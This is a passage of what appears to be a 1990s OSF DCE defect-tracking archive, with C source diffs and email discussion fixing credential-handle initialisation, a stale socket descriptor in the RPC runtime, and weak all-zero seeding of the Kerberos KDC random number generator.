  	return rst;
  
      }
***************
*** 470,475 ****
- --- 475,484 ----
  	 */
  	if (auth_info->authz_svc != rpc_c_authz_dce) {
  	    cred_handle->auth_info.authz_svc = rpc_c_authz_none;
+ #ifdef hitm
+ 	    authz_cred_handle->data = (idl_void_p_t) cred_handle;
+ 	    authz_cred_handle->magic = AUTHZ_CRED_HANDLE_MAGIC;
+ #endif
  	    return rst;
  	}
  

From wwang@osf.org  Wed Mar 22 09:13:12 1995
Cc: scnotes@osf.org
From: Weidong Wang from OSF <wwang@osf.org>

	I noticed sth else when reading the code (sec_cred_internal.c,
sec__cred_create_authz_handle() ):

    if (auth_info->authz_svc == rpc_c_authz_none) {
        /*
         * if no authorization service info, then just return.  Any attempt
         * to extract any authz info of any kind from the cred handle will
         * result in sec_cred_s_authz_svc_cannot_comply errors
         */
        cred_handle->auth_info.authz_svc = auth_info->authn_svc;
        return rst;

    }


I noticed that it assigns auth_info->authn_svc (the authentication info) to
the authorization info field. Shouldn't it be:

        cred_handle->auth_info.authz_svc = auth_info->authz_svc;

What do you think? Considering the next case when (auth_info->authz_svc !=
rpc_c_authz_dce), it assigns 

            cred_handle->auth_info.authz_svc = rpc_c_authz_none;


< mail from support customer Wed, 14 Feb 1996 >
< The code excerpt below from the customer contains their latest changes >
< to the security/utils/sec__cred_create_authz_handle routine.           >

I think the best I can do is to send you our source file, indicating how we
were running w/o known problems.  The modified code is conditional to "hitm".
As indicated in the mail history, the first change is a distinct issue from
the other two. 
    
PUBLIC  error_status_t  sec__cred_create_authz_handle (
    sec__cred_auth_info_t    *auth_info,
    sec_bytes_t              *delegation_chain,
    sec_dlg_token_set_t      *dlg_token_set,
    sec_id_seal_set_t        *seal_set,
    rpc_authz_cred_handle_t  *authz_cred_handle
)
{
    sec__cred_handle_t      *cred_handle = NULL;
    int                     i;
    error_status_t          rst;
#ifndef hitm
    authz_cred_handle->magic = AUTHZ_CRED_HANDLE_MAGIC;
#endif
    cred_handle = (sec__cred_handle_t *) MALLOC(sizeof(sec__cred_handle_t));
    if (cred_handle == NULL) {
	return sec_s_no_memory;
    }

    CLEAR_STATUS(&rst);
    memset(cred_handle, 0, sizeof(*cred_handle));

    cred_handle->auth_info.handle_type = auth_info->handle_type;

    /* Initialize sec_cred_get_authz_session_info() specific variables */
    uuid_create_nil(&cred_handle->session_id, &rst);
    cred_handle->session_expiration = 0;

    /* 
     * if no authorization service info, then just return.  Any attempt
     * to extract any authz info of any kind from the cred handle will
     * result in sec_cred_s_authz_svc_cannot_comply errors
     */
    if (auth_info->authz_svc == rpc_c_authz_none) {
	/* 
	 * if no authorization service info, then just return.  Any attempt
	 * to extract any authz info of any kind from the cred handle will
	 * result in sec_cred_s_authz_svc_cannot_comply errors
	 */
	cred_handle->auth_info.authz_svc = auth_info->authn_svc;
#ifdef hitm
	authz_cred_handle->data = (idl_void_p_t) cred_handle;
	authz_cred_handle->magic = AUTHZ_CRED_HANDLE_MAGIC;
#endif
	return rst;

    }

    /* 
     * if this is a client side handle, then all we use is the delegation
     * chain, and we decode it right away.
     */
    if (auth_info->handle_type == sec__cred_handle_type_client) {
	/* 
	 * The only legitimate authz_svc value for a client cred handle is
	 * rpc_c_authz_dce.  We rely on the caller to call us correctly, 
         * so if we spot anything funny, we behave as though the 
	 * authz_svc were "none".  Any attempt to use the resulting
         * cred handle will result in sec_cred_s_authz_svc_cannot_comply
         * errors, but that's okay because this is an internal error
         * condition which should never arise in the first place.
	 */
	if (auth_info->authz_svc != rpc_c_authz_dce) {
	    cred_handle->auth_info.authz_svc = rpc_c_authz_none;
#ifdef hitm
	    authz_cred_handle->data = (idl_void_p_t) cred_handle;
	    authz_cred_handle->magic = AUTHZ_CRED_HANDLE_MAGIC;
#endif
	    return rst;
	}

	cred_handle->auth_info.authz_svc = rpc_c_authz_dce;

	/* 
	 * alias the delegation chain storage in the auth_info parameter
	 * so we can decode it
	 */
	DLG_CHAIN(cred_handle) = *delegation_chain;
	sec___cred_decode_epac_set(cred_handle, &rst);
	/*
         * now undo the alasing so we won't free up storage that isn't ours
         * somewhere down the line.
         */
 	DLG_CHAIN(cred_handle).num_bytes = 0;
	DLG_CHAIN(cred_handle).bytes = NULL;
    }

    cred_handle->auth_info.authenticated = auth_info->authenticated;

    /*
     * Server-side cred handles use everything in the auth_info block
     */
    if (auth_info->handle_type == sec__cred_handle_type_server) {
#ifndef KERNEL
        if (auth_info->server_princ_name != NULL) {
            cred_handle->auth_info.server_princ_name = (unsigned_char_p_t)
	        strdup((char *)auth_info->server_princ_name);
        } else {
            cred_handle->auth_info.server_princ_name = (unsigned_char_p_t)NULL;
        }
#else
        cred_handle->auth_info.server_princ_name = (unsigned_char_p_t)NULL;
#endif /*KERNEL*/
	cred_handle->auth_info.protect_level = auth_info->protect_level;
	cred_handle->auth_info.authn_svc = auth_info->authn_svc;
	cred_handle->auth_info.authz_svc = auth_info->authz_svc;

	if (auth_info->authz_svc == rpc_c_authz_name) {
#ifndef KERNEL
	    /*
	     * need to make a copy of the client principal name
	     */
            if (auth_info->authz_info.client_princ_name != NULL) {
                CLIENT_PRINC(cred_handle) = (unsigned_char_p_t)
		    strdup((char *)auth_info->authz_info.client_princ_name);
            } else {
                CLIENT_PRINC(cred_handle) = (unsigned_char_p_t) NULL;
            }
#else
            CLIENT_PRINC(cred_handle) = (unsigned_char_p_t) NULL;
#endif /*KERNEL*/
	} else if (auth_info->authz_svc == rpc_c_authz_dce) {
	/*
	 * Need to stash away a copy of the delegation token for future use in
	 * priv server delegation calls.
	 */
	if (dlg_token_set != NULL) {
	    if ((DLG_TOKEN(cred_handle).num_tokens =
                dlg_token_set->num_tokens) == 0) {
                DLG_TOKEN(cred_handle).tokens = NULL;
            } else {
                /* Make room for the array of tokens */
                DLG_TOKEN(cred_handle).tokens = (sec_dlg_token_t *)
                  MALLOC(dlg_token_set->num_tokens * sizeof(sec_dlg_token_t));
                if (DLG_TOKEN(cred_handle).tokens == NULL) {
                    FREE(cred_handle);
		    return(sec_s_no_memory);
                }
                memset(DLG_TOKEN(cred_handle).tokens, 0,
                    (dlg_token_set->num_tokens * sizeof(sec_dlg_token_t)));


                /* Copy each individual token entry */
                for (i = 0; i < dlg_token_set->num_tokens; i++) {
                   DLG_TOKEN(cred_handle).tokens[i].expiration =
                        dlg_token_set->tokens[i].expiration;
                    if ((DLG_TOKEN(cred_handle).tokens[i].token_bytes.num_bytes = dlg_token_set->tokens[i].token_bytes.num_bytes) == 0) {
                       DLG_TOKEN(cred_handle).tokens[i].token_bytes.bytes = NULL;
                    } else {
                        DLG_TOKEN(cred_handle).tokens[i].token_bytes.bytes = (idl_byte *) MALLOC(dlg_token_set->tokens[i].token_bytes.num_bytes);
                        memcpy(DLG_TOKEN(cred_handle).tokens[i].token_bytes.bytes,
                            dlg_token_set->tokens[i].token_bytes.bytes,
                            dlg_token_set->tokens[i].token_bytes.num_bytes);
                    }
                }
	    }
	}


	    /* FAKE-EPAC
	     * Need to do something about "backdoor" authentication
	     * info here (krb5 session key and ticket expiration times,
	     * etc.  This info will be stored only if the server principal
	     * in the request is one of the architectural service names
	     * for the security service.
	     */

	    /* 
	     * If we're creating the handle on behalf of a server
	     * we have to stash away a copy of the delegation chain because
	     * it might be needed later by an intermediary for use in priv
	     * server delegation calls.  All decoding will  be done
	     * on demand as accessor functions are called.
	     */
	    if (GOOD_STATUS(&rst) && delegation_chain->num_bytes > 0) {
		DLG_CHAIN(cred_handle).num_bytes = delegation_chain->num_bytes;
		DLG_CHAIN(cred_handle).bytes = (idl_byte *) MALLOC(delegation_chain->num_bytes);
		if (DLG_CHAIN(cred_handle).bytes != NULL) {
		    memcpy(DLG_CHAIN(cred_handle).bytes, 
			   delegation_chain->bytes,
			   delegation_chain->num_bytes);
		    DLG_CHAIN(cred_handle).num_bytes = delegation_chain->num_bytes;
		} else { 
                    SET_STATUS(&rst, sec_s_no_memory);
                }
	    }
	    
	}
    }   

    if (BAD_STATUS(&rst)) {
	if (auth_info->handle_type == sec__cred_handle_type_client) {
	    sec___cred_free_handle(cred_handle);

	} else { /* handle_type == sec__cred_handle_type_server */
	    if (DLG_CHAIN(cred_handle).bytes != NULL) {
		FREE(DLG_CHAIN(cred_handle).bytes);
	    }
	    if (DLG_TOKEN(cred_handle).tokens != NULL) {
                for (i = 0; i < dlg_token_set->num_tokens; i++) {
                    if (DLG_TOKEN(cred_handle).tokens[i].token_bytes.bytes != NULL)
                        FREE(DLG_TOKEN(cred_handle).tokens[i].token_bytes.bytes);
                }
                FREE(DLG_TOKEN(cred_handle).tokens);
	    }
	}
	return rst;
    }

    /*
     * store a copy of our authz_cred_handle reference locally
     * for use in future handle integrity checks.
     */
    cred_handle->magic = cred_handle;

    /*
     * fill in the authz_cred_handle
     * !!! Probably need some logic here to either reject
     *      reallocation of an already valid cred handle
     *      or call the destructor function to get rid of
     *      the existing resources.
     */
    LOCK_CRED_KERNEL {
	authz_cred_handle->data = (idl_void_p_t) cred_handle;
	authz_cred_handle->magic = AUTHZ_CRED_HANDLE_MAGIC;
    } UNLOCK_CRED_KERNEL;

    return error_status_ok;

	
}

-------



CR Number                     : 13350
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : invalid use of socket desciptor CN rpc runtime.
Reported Date                 : 2/21/96
Found in Baseline             : 1.1
Found Date                    : 2/21/96
Severity                      : C
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : rpc/runtime/cnrcvr.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/21/96 public]

==============================================================================
Diffing Delta aswini-17317-rpc-runtime-cn-invalidate-closed-sock-fd 1.1
==============================================================================
File: rpc/runtime/cnrcvr.c
*** 12.7        1995/12/20 17:53:04
--- 12.10       1996/01/31 16:18:11
***************
*** 2,7 ****
--- 2,15 ----
   * @TRANSARC_COPYRIGHT@
   *
   * $TALog: cnrcvr.c,v $
+  * Revision 12.10  1996/01/31  16:18:11  aswini
+  * Invalidate the closed socket in the association. Hence close the
+  * the window in which the receiver closes the socket and the RPC thread uses 
the
+  * the closed socket desciptor, which may not belong to it any more.
+  *
+  * See above.
+  * [from r12.7 by delta aswini-17317-rpc-runtime-cn-invalidate-closed-sock-fd,
 r1.1]
+  *
***************
*** 528,533 ****
--- 536,542 ----
                  }
                  
                  assoc->cn_ctlblk.cn_state = RPC_C_CN_CLOSED;
+                 assoc->cn_ctlblk.cn_sock = -1;
                  
                  /*
                   * Remove any pending cancel on this assoc. Otherwise, it's

[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13349
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : kdc
Short Description             : better RNG seeding
Reported Date                 : 2/21/96
Found in Baseline             : 1.0.3
Found Date                    : 2/21/96
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 1.1maint
Affected File(s)              : security/h/rs_mkey.h, security/krb5/kdc/main.c security/server/rs/rs_mkey.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/21/96 public]

secd uses an all-zero keyblock to seed its random number genrator.  It
should be strengthened to use something more random.  The following diffs
are extensive, because they include some unrelated code-cleanup (ANSIfication)
work.  Search for rs_mkey_random_keyblock to see the important changes.


*** rs_mkey.h	Tue Dec 29 13:08:28 1992
--- rs_mkey.h.orig	Wed Feb 14 12:44:20 1996
***************
*** 8,13 ****
--- 8,18 ----
  /*
   * HISTORY
   * $Log:	c013349,v $
# Revision 1.2  96/09/24  14:39:21  root
# changed fields: Fixed In Baseline   new/changed/deleted note(s) [rsalz 2/21/96 public] [rsalz 2/21/96 public]
# 
# Revision 1.1  96/02/21  13:11:24  root
# new CR
# 
+  * Revision /main/HPDCE02/1  1996/02/14  17:44 UTC  jrr
+  * 	Code cleanup.
+  * 	Fix weakness in random key generation.
+  * 	[1996/02/10  01:22 UTC  sommerfeld  /main/sommerfeld_krb5rng/1]
+  * 
   * Revision 1.1.3.5  1992/12/29  13:08:28  zeliff
   * 	Embedding copyright notice
   * 	[1992/12/28  20:44:48  zeliff]
***************
*** 47,125 ****
  
  
  void rs_mkey_create (
- #ifdef __STDC__
      sec_id_t            *rgy_local_cell,
      char                *keyseed
- #endif
  );
  
  void rs_mkey_init (
- #ifdef __STDC__
      unsigned32          rep_state,
      error_status_t      *st_p
- #endif
  );
  
  void rs_mkey_store_in_db (
- #ifdef __STDC__
      error_status_t      *st_p
- #endif
  );
  
  void rs_mkey_verify (
- #ifdef __STDC__
      krb5_keyblock           *mkey,
      krb5_kvno               mkey_version,
      krb5_encrypt_block      *eblock,
      error_status_t          *st_p
- #endif
  );
  
  void rs_mkey_encrypt_with_master (
- #ifdef __STDC__
      krb5_keyblock               *in,
      krb5_encrypted_keyblock     *out,
      error_status_t              *st_p
- #endif
  );
  
  void rs_mkey_decrypt_with_master (
- #ifdef __STDC__
      krb5_kvno                   mkey_version,
      krb5_encrypted_keyblock     *in,
      krb5_keyblock               *out,
      error_status_t              *st_p
- #endif
  );
        
  void rs_mkey_random (
- #ifdef __STDC__
      sec_passwd_rec_t    *passwd,
      error_status_t      *st_p
- #endif
  );
  
  void rs_mkey_string_to_key (
- #ifdef __STDC__
      krb5_keytype        keytype,
      krb5_data           *pwd_data,
      krb5_data           *pepper,
      krb5_keyblock       *key,
      error_status_t      *st_p
- #endif
  );
  
  void rs_mkey_change (
- #ifdef __STDC__
      error_status_t      *st_p
- #endif
  );
  
  
  void rs_mkey_purge (
- #ifdef __STDC__
      void
- #endif
  );
  
  
--- 52,115 ----
  
  
  void rs_mkey_create (
      sec_id_t            *rgy_local_cell,
      char                *keyseed
  );
  
  void rs_mkey_init (
      unsigned32          rep_state,
      error_status_t      *st_p
  );
  
  void rs_mkey_store_in_db (
      error_status_t      *st_p
  );
  
  void rs_mkey_verify (
      krb5_keyblock           *mkey,
      krb5_kvno               mkey_version,
      krb5_encrypt_block      *eblock,
      error_status_t          *st_p
  );
  
  void rs_mkey_encrypt_with_master (
      krb5_keyblock               *in,
      krb5_encrypted_keyblock     *out,
      error_status_t              *st_p
  );
  
  void rs_mkey_decrypt_with_master (
      krb5_kvno                   mkey_version,
      krb5_encrypted_keyblock     *in,
      krb5_keyblock               *out,
      error_status_t              *st_p
  );
        
  void rs_mkey_random (
      sec_passwd_rec_t    *passwd,
      error_status_t      *st_p
  );
  
+ error_status_t rs_mkey_random_keyblock
+ (
+     krb5_keyblock **random_key
+ );
+ 
  void rs_mkey_string_to_key (
      krb5_keytype        keytype,
      krb5_data           *pwd_data,
      krb5_data           *pepper,
      krb5_keyblock       *key,
      error_status_t      *st_p
  );
  
  void rs_mkey_change (
      error_status_t      *st_p
  );
  
  
  void rs_mkey_purge (
      void
  );
  
  



*** main.c	Thu Oct 14 13:45:20 1993
--- main.c.orig	Wed Feb 14 12:49:24 1996
***************
*** 8,13 ****
--- 8,19 ----
  /*
   * HISTORY
   * $Log:	c013349,v $
# Revision 1.2  96/09/24  14:39:21  root
# changed fields: Fixed In Baseline   new/changed/deleted note(s) [rsalz 2/21/96 public] [rsalz 2/21/96 public]
# 
# Revision 1.1  96/02/21  13:11:24  root
# new CR
# 
+  * Revision /main/HPDCE02/1  1996/02/14  17:49 UTC  jrr
+  * 	Code cleanup.
+  * 	Fix weakness in random key generation.
+  * 	Silence compiler warnings.
+  * 	[1996/02/10  01:22 UTC  sommerfeld  /main/sommerfeld_krb5rng/1]
+  * 
   * Revision 1.1.7.1  1993/10/14  17:45:20  mccann
   * 	CR8651 64bit port
   * 	[1993/10/14  17:42:53  mccann]
***************
*** 48,55 ****
   * All Rights Reserved
   */
  /*
!  * $Source: /project/ot/dce/d01/d33/RCS/c013349,v $
!  * $Author: root $
   *
   * Copyright 1990 by the Massachusetts Institute of Technology.
   *
--- 54,61 ----
   * All Rights Reserved
   */
  /*
!  * $Source: /project/ot/dce/d01/d33/RCS/c013349,v $
!  * $Author: root $
   *
   * Copyright 1990 by the Massachusetts Institute of Technology.
   *
***************
*** 75,81 ****
  
  #if !defined(lint) && !defined(SABER)
  static char rcsid_main_c[] =
! "$Id: c013349,v 1.2 96/09/24 14:39:21 root Exp $";
  #endif	/* !lint & !SABER */
  
  #include <krb5/krb5.h>
--- 81,87 ----
  
  #if !defined(lint) && !defined(SABER)
  static char rcsid_main_c[] =
! "$Id: c013349,v 1.2 96/09/24 14:39:21 root Exp $";
  #endif	/* !lint & !SABER */
  
  #include <krb5/krb5.h>
***************
*** 87,95 ****
  
  #include <com_err.h>
  /* for STDC, com_err gets varargs/stdarg */
- #ifndef __STDC__
- #include <varargs.h>
- #endif
  
  #include <krb5/osconf.h>
  #include <krb5/kdb.h>
--- 93,98 ----
***************
*** 109,126 ****
  #ifdef OSF_DCE
  #   include <rgymacro.h>
  #   include <rs_task.h>
  #endif
  
  
  static void
  kdc_com_err_proc
- #ifndef __STDC__
-     (whoami, code, format, pvar)
- 	const char *whoami;
- 	long code;
- 	const char *format;
- 	va_list pvar;
- #else
    (
  	const char *whoami,
  	long code,
--- 112,123 ----
  #ifdef OSF_DCE
  #   include <rgymacro.h>
  #   include <rs_task.h>
+ #   include <rs_mkey.h>
  #endif
  
  
  static void
  kdc_com_err_proc
    (
  	const char *whoami,
  	long code,
***************
*** 127,139 ****
  	const char *format,
  	va_list pvar
    )
- #endif
  {
      /* XXX need some way to do this better... */
  
- #ifndef __STDC__
-     extern int vfprintf();
- #endif
  
  #if defined(OSF_DCE) && (defined(ultrix) || defined(__osf__))
      /* Ultrix integration must rely on bsd4.2 syslog instead
--- 124,132 ----
***************
*** 180,188 ****
  
  void
  setup_com_err(
- #ifdef __STDC__
      void
- #endif
  )
  {
  #ifndef OSF_DCE
--- 173,179 ----
***************
*** 196,206 ****
      return;
  }
  
  krb5_sigtype
  request_exit(
- #ifdef __STDC__
      void
- #endif
  )
  {
      signal_requests_exit = 1;
--- 187,197 ----
      return;
  }
  
+ 
+ #ifndef OSF_DCE
  krb5_sigtype
  request_exit(
      void
  )
  {
      signal_requests_exit = 1;
***************
*** 208,214 ****
      return;
  }
  
- #ifndef OSF_DCE
  /* Don't setup signal handlers in pthread environment when the server is
   * a thread in the DCE security daemon.
   */
--- 199,204 ----
***************
*** 225,238 ****
  
  void
  usage
- #ifndef __STDC__
-     (name)
-     char *name;
- #else
    (
      char *name
    )
- #endif
  {
      fprintf(stderr, "usage: %s [-d dbpathname] [-r dbrealmname] [-R replaycachename ]\n\t[-m] [-k masterkeytype] [-M masterkeyname]\n", name);
      return;
--- 215,223 ----
***************
*** 240,255 ****
  
  void
  process_args
- #ifndef __STDC__
-     (argc, argv)
-     int argc;
-     char **argv;
- #else
    (
      int argc,
      char **argv
    )
- #endif
  {
      int c;
      krb5_boolean manual = FALSE;
--- 225,234 ----
***************
*** 261,267 ****
      krb5_error_code retval, retval2;
      krb5_enctype etype;
      extern krb5_deltat krb5_clockskew;
! 
      extern char *optarg;
  
      while ((c = getopt(argc, argv, "r:d:mM:k:R:")) != EOF) {
--- 240,247 ----
      krb5_error_code retval, retval2;
      krb5_enctype etype;
      extern krb5_deltat krb5_clockskew;
!     krb5_keyblock *random_keyblock;
!     
      extern char *optarg;
  
      while ((c = getopt(argc, argv, "r:d:mM:k:R:")) != EOF) {
***************
*** 352,362 ****
  	(void) krb5_rc_close(kdc_rcache);
  	exit(1);
      }
  #else
!     master_keyblock.keytype = KEYTYPE_DES;
!     master_keyblock.length = 8;
!     master_keyblock.contents = (krb5_octet *) malloc(master_keyblock.length);
!     bzero(master_keyblock.contents, master_keyblock.length);
  #endif
  
      /* initialize random key generators */
--- 332,346 ----
  	(void) krb5_rc_close(kdc_rcache);
  	exit(1);
      }
+     random_keyblock = &master_keyblock;
  #else
!     retval = rs_mkey_random_keyblock(&random_keyblock);
!     if (retval != NULL) 
!     {
! 	com_err(argv[0], retval, "while generating random key seed");
! 	(void) krb5_rc_close(kdc_rcache);
! 	exit(1);
!     }
  #endif
  
      /* initialize random key generators */
***************
*** 363,369 ****
      for (etype = 0; (int) etype <= krb5_max_cryptosystem; etype++) {
  	if (krb5_csarray[etype]) {
  	    if (retval = (*krb5_csarray[etype]->system->
! 			  init_random_key)(&master_keyblock,
  					   &krb5_csarray[etype]->random_sequence)) {
  		com_err(argv[0], retval, "while setting up random key generator for etype %d--etype disabled", etype);
  		krb5_csarray[etype] = 0;
--- 347,353 ----
      for (etype = 0; (int) etype <= krb5_max_cryptosystem; etype++) {
  	if (krb5_csarray[etype]) {
  	    if (retval = (*krb5_csarray[etype]->system->
! 			  init_random_key)(random_keyblock,
  					   &krb5_csarray[etype]->random_sequence)) {
  		com_err(argv[0], retval, "while setting up random key generator for etype %d--etype disabled", etype);
  		krb5_csarray[etype] = 0;
***************
*** 376,389 ****
  
  void
  finish_args
- #ifndef __STDC__
-     (prog)
-     char *prog;
- #else
    (
      char *prog
    )
- #endif
  {
      krb5_error_code retval;
      if (retval = krb5_rc_close(kdc_rcache)) {
--- 360,368 ----
***************
*** 397,414 ****
  
  krb5_error_code
  init_db
- #ifndef __STDC__
-     (dbname, masterkeyname, masterkeyblock)
-     char *dbname;
-     krb5_principal masterkeyname;
-     krb5_keyblock *masterkeyblock;
- #else
    (
      char *dbname,
      krb5_principal masterkeyname,
      krb5_keyblock *masterkeyblock
    )
- #endif
  {
      krb5_error_code retval;
      int nprincs;
--- 376,386 ----
***************
*** 504,512 ****
  
  krb5_error_code
  closedown_db(
- #ifdef __STDC__
      void
- #endif
  )
  {
      krb5_error_code retval;
--- 476,482 ----
***************
*** 609,615 ****
      krb5_error_code retval;
      int errout = 0;
  #ifdef OSF_DCE
!     krb5_ui_4 sleep_time = 120;       /*  decaying sleep time */
  #endif
  
  #ifdef OSF_DCE
--- 579,585 ----
      krb5_error_code retval;
      int errout = 0;
  #ifdef OSF_DCE
!     unsigned32 sleep_time = 120;       /*  decaying sleep time */
  #endif
  
  #ifdef OSF_DCE






*** rs_mkey.c	Thu Aug 25 17:21:09 1994
--- rs_mkey.c.orig	Wed Feb 14 12:52:11 1996
***************
*** 8,13 ****
--- 8,19 ----
  /*
   * HISTORY
   * $Log:	c013349,v $
# Revision 1.2  96/09/24  14:39:21  root
# changed fields: Fixed In Baseline   new/changed/deleted note(s) [rsalz 2/21/96 public] [rsalz 2/21/96 public]
# 
# Revision 1.1  96/02/21  13:11:24  root
# new CR
# 
+  * Revision /main/HPDCE02/1  1996/02/14  17:52 UTC  jrr
+  * 	Code cleanup.
+  * 	Fix weakness in random key generation.
+  * 	Silence compiler warnings.
+  * 	[1996/02/10  01:22 UTC  sommerfeld  /main/sommerfeld_krb5rng/1]
+  * 
   * Revision 1.1.7.2  1994/08/25  20:14:23  sekhar
   * 	Put back SVC messages for fatal_st() and error_st() calls.
   * 	[1994/08/25  20:12:49  sekhar]
***************
*** 54,60 ****
  
  #ifdef MODULE_VERSION_ID
  static char *VersionID = 
!     "$Id: c013349,v 1.2 96/09/24 14:39:21 root Exp $";
  #endif
  
  #include <stdio.h>
--- 60,66 ----
  
  #ifdef MODULE_VERSION_ID
  static char *VersionID = 
!     "$Id: c013349,v 1.2 96/09/24 14:39:21 root Exp $";
  #endif
  
  #include <stdio.h>
***************
*** 123,136 ****
   *  No lock required.
   */
  PRIVATE void rs_mkey_gen_init_keyseed
- #ifndef __STDC__
-     ( mname, eblock, keyseed, mkey, st_p )
-     krb5_principal      mname;              /* [in] */
-     krb5_encrypt_block  *eblock;            /* [in] */
-     char                *keyseed;           /* [in] */
-     krb5_keyblock       *mkey;              /* [in, out] */
-     error_status_t      *st_p;              /* [out] */
- #else
      (
      krb5_principal      mname,
      krb5_encrypt_block  *eblock,
--- 129,134 ----
***************
*** 138,144 ****
      krb5_keyblock       *mkey,
      error_status_t      *st_p
      )
- #endif
  {
      krb5_data           scratch;
      krb5_data           pwd;
--- 136,141 ----
***************
*** 211,224 ****
   *  No lock required.
   */
  PRIVATE void rs_mkey_gen_new
- #ifndef __STDC__
-     ( old_rblock, new_mkeyblock, new_master_eblock, new_rblock, st_p )
-     rsdb_realm_info         *old_rblock;        /* [in] */
-     krb5_keyblock           **new_mkeyblock;    /* [out] */
-     krb5_encrypt_block      *new_master_eblock; /* [out] */
-     rsdb_realm_info         *new_rblock;        /* [out] */
-     error_status_t          *st_p;              /* [out] */
- #else
      (
      rsdb_realm_info         *old_rblock,
      krb5_keyblock           **new_mkeyblock,
--- 208,213 ----
***************
*** 226,232 ****
      rsdb_realm_info         *new_rblock,
      error_status_t          *st_p
      )
- #endif
  {
      CLEAR_STATUS(st_p);
  
--- 215,220 ----
***************
*** 274,286 ****
   *  No lock required.
   */
  PRIVATE void rs_mkey_encrypt_key
- #ifndef __STDC__
-     ( eblock, in, out, st_p )
-     krb5_encrypt_block          *eblock;
-     krb5_keyblock               *in;
-     krb5_encrypted_keyblock     *out;
-     error_status_t              *st_p;
- #else
      (
      krb5_encrypt_block          *eblock,
      krb5_keyblock               *in,
--- 262,267 ----
***************
*** 287,293 ****
      krb5_encrypted_keyblock     *out,
      error_status_t              *st_p
      )
- #endif
  {
      /* encrypted rep has the real (unencrypted) key length stored
         along with the encrypted key */
--- 268,273 ----
***************
*** 351,363 ****
   *  No lock required.
   */
  PRIVATE void rs_mkey_decrypt_key
- #ifndef __STDC__
-     ( eblock, in, out, st_p )
-     krb5_encrypt_block          *eblock;
-     krb5_encrypted_keyblock     *in;
-     krb5_keyblock               *out;
-     error_status_t              *st_p;
- #else
      (
      krb5_encrypt_block          *eblock,
      krb5_encrypted_keyblock     *in,
--- 331,336 ----
***************
*** 364,370 ****
      krb5_keyblock               *out,
      error_status_t              *st_p
      )
! #endif
  {
      CLEAR_STATUS(st_p);
      /* the encrypted version is stored as the unencrypted key length
--- 337,343 ----
      krb5_keyblock               *out,
      error_status_t              *st_p
      )
! 
  {
      CLEAR_STATUS(st_p);
      /* the encrypted version is stored as the unencrypted key length
***************
*** 419,431 ****
   *  so that the master_key doesn't change during the operation.
   */
  PRIVATE void rs_mkey_fetch
- #ifndef __STDC__
-     ( keyfile, key, key_version, st_p )
-     char                        *keyfile;       /* [in] */
-     krb5_keyblock               *key;           /* [out] */
-     krb5_kvno                   *key_version;   /* [out] */
-     error_status_t              *st_p;          /* [out] */
- #else
      (
      char                        *keyfile,
      krb5_keyblock               *key,
--- 392,397 ----
***************
*** 432,438 ****
      krb5_kvno                   *key_version,
      error_status_t              *st_p
      )
- #endif
  {
      rsdb_auth_key_t     rsdb_key;
  
--- 398,403 ----
***************
*** 471,490 ****
   *  This operation must be invoked with the global write lock.
   */
  PRIVATE void rs_mkey_store_on_disk
- #ifndef __STDC__
-     ( keyfile, key, key_version, st_p )
-     char                        *keyfile;       /* [in] */
-     krb5_keyblock               *key;           /* [in] */
-     krb5_kvno                   key_version;    /* [in] */
-     error_status_t              *st_p;          /* [out] */
- #else
      (
!     char                        *keyfile,
!     krb5_keyblock               *key,
!     krb5_kvno                   key_version,
!     error_status_t              *st_p
      )
- #endif
  {
      rsdb_auth_key_t     rsdb_key;
  
--- 436,447 ----
   *  This operation must be invoked with the global write lock.
   */
  PRIVATE void rs_mkey_store_on_disk
      (
!     char                        *keyfile,	/* [in] */
!     krb5_keyblock               *key,		/* [in] */
!     krb5_kvno                   key_version,    /* [in] */
!     error_status_t              *st_p		/* [out] */
      )
  {
      rsdb_auth_key_t     rsdb_key;
  
***************
*** 521,540 ****
   *  This operation must be invoked with the global write lock.
   */
  PRIVATE void rs_mkey_encrypt_store_in_db
- #ifndef __STDC__
-     ( mkey,  mkey_version, encblock, st_p )
-     krb5_keyblock       *mkey;
-     krb5_kvno           mkey_version;
-     krb5_encrypt_block  *encblock;
-     error_status_t      *st_p;
- #else
    (
!     krb5_keyblock       *mkey,
!     krb5_kvno           mkey_version,
!     krb5_encrypt_block  *encblock,
!     error_status_t      *st_p
    )
- #endif
  {
      krb5_encrypted_keyblock ekey;
      rsdb_encrypt_key_t      encrypted_mkey;
--- 478,489 ----
   *  This operation must be invoked with the global write lock.
   */
  PRIVATE void rs_mkey_encrypt_store_in_db
    (
!     krb5_keyblock       *mkey,			/* [in] */
!     krb5_kvno           mkey_version,		/* [in] */
!     krb5_encrypt_block  *encblock,		/* [in] */
!     error_status_t      *st_p			/* [out] */
    )
  {
      krb5_encrypted_keyblock ekey;
      rsdb_encrypt_key_t      encrypted_mkey;
***************
*** 581,600 ****
   *  rs_mkey_save should be invoked with the global write lock.
   */
  PRIVATE void rs_mkey_save
- #ifndef __STDC__
-     ( new_mkeyblock, new_master_eblock, new_mkey_version, st_p )
-     krb5_keyblock           *new_mkeyblock;     /* [in] */
-     krb5_encrypt_block      *new_master_eblock; /* [in] */
-     krb5_kvno               *new_mkey_version;  /* [in] */
-     error_status_t          *st_p;              /* [out] */
- #else
      (
!     krb5_keyblock           *new_mkeyblock,
!     krb5_encrypt_block      *new_master_eblock,
!     krb5_kvno               *new_mkey_version,
!     error_status_t          *st_p
      )
- #endif
  {
      sec_rgy_name_t          old_master_key_file;
  
--- 530,541 ----
   *  rs_mkey_save should be invoked with the global write lock.
   */
  PRIVATE void rs_mkey_save
      (
!     krb5_keyblock           *new_mkeyblock,	/* [in] */
!     krb5_encrypt_block      *new_master_eblock,	/* [in] */
!     krb5_kvno               *new_mkey_version,	/* [in] */
!     error_status_t          *st_p		/* [out] */
      )
  {
